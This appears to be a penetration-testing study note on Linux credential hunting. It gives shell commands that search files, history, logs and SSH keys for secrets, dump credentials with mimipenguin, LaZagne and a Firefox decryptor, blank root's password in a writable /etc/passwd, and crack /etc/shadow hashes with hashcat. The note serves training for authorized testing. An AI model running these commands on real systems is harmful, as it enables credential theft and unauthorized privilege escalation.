|**`Files`**|**`History`**|**`Memory`**|**`Key-Rings`**|
|---|---|---|---|
|Configs|Logs|Cache|Browser stored credentials|
|Databases|Command-line History|In-memory Processing||
|Notes||||
|Scripts||||
|Source codes||||
|Cronjobs||||
|SSH Keys|||

### Files
#### Bash History 
```shell
 tail -n5 /home/*/.bash*
```


#### Config Files 
```shell
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
Passwords in config files
```shell
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
#### Databases
```shell
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
#### Notes
```shell
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
#### Scripts
```shell
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
#### Cronjobs
```shell
cat /etc/crontab 
```

```shell
 ls -la /etc/cron.*/
```

#### SSH Keys
Private Keys
```shell
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```
Public Keys 
```shell
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
#### Logs
```shell
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

### Memory and Cache 
[Mimipenguin](https://github.com/huntergregal/mimipenguin)
```shell
 sudo python3 mimipenguin.py
```

LaZange
```shell
sudo python2.7 laZagne.py all
```

### Browsers 
Firefox 
```shell
ls -l .mozilla/firefox/ | grep default 
```

```shell
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```
Decrypt Passwords 
[Firefox decrypt](https://github.com/unode/firefox_decrypt)
```shell
python3.9 firefox_decrypt.py
```

## Passwd, Shadow and Opasswd

Many use different authentication mechanisms. 
The most common is Plugable Authentication Modules. 
	pam_unix.so
	pam_unix2.so
	Located in /usr/lib/x86_x64-linux-gnu/security/ in Debian

pam_unix.so standard module for management uses standardised API calls from system libraries and files to update account information.  Files are read and updated are /etc/passwd and /etc/shadow.

### Passwd File

Contains existing user on the system and can be read by all users and services. 
Readable system wide
Each entry identifies a use on the system.

|`cry0l1t3`|`:`|`x`|`:`|`1000`|`:`|`1000`|`:`|`cry0l1t3,,,`|`:`|`/home/cry0l1t3`|`:`|`/bin/bash`|
|---|---|---|---|---|---|---|---|---|---|---|---|---|
|Login name||Password info||UID||GUID||Full name/comments||Home directory||Shell|

Very rare for the hash to be encrypted in password information.
Most commonly stored in /etc/shadow

If the file is writable remove the password entry

```shell
root:x:0:0:root:/root:/bin/bash
```
```shell
root::0:0:root:/root:/bin/bash
```
```shell
su 
```

```shell
sudo cp /etc/passwd /tmp/passwd.bak 
```
### Shadow File 
Only contains passwords 

|`cry0l1t3`|`:`|`$6$wBRzy$...SNIP...x9cDWUxW1`|`:`|`18937`|`:`|`0`|`:`|`99999`|`:`|`7`|`:`|`:`|`:`|
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
|Username||Encrypted password||Last PW change||Min. PW age||Max. PW age||Warning period|Inactivity period|Expiration date|Unused|

```shell
sudo cat /etc/shadow
```
If the password contains a character such as ! or * the user cannot login with a Unix Password. Can still use other authentication methods such as Kerberos or key-based. 
#### Algorithm Types
- `$1$` – MD5
- `$2a$` – Blowfish
- `$2y$` – Eksblowfish
- `$5$` – SHA-256
- `$6$` – SHA-512

#### Cracking Shadow 

```shell
sudo cp /etc/shadow /tmp/shadow.bak 
```
```shell
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```
```shell
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

### Opasswd

PAM can prevent old passwords being reused. 
Old passwords stored in /etc/security/opasswd.
Root is required to read the file if the permissions have not been changed manually. 

Passwords separated by a comma. 
```shell
sudo cat /etc/security/opasswd
```